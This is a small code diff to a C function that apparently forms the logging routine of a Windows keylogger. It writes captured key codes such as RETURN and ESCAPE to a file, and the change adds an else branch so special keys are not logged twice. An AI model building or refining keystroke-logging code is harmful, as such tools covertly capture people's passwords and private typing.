@@ -19,7 +19,8 @@ int save(int _key, char const *file)
         fprintf(OUTPUT_FILE, "%s", "[RETURN]");
     else if( _key == VK_ESCAPE)
         fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
-    fprintf(OUTPUT_FILE,"%s", &_key);
+    else
+        fprintf(OUTPUT_FILE,"%s", &_key);
     fclose(OUTPUT_FILE);
     return 0;
 }
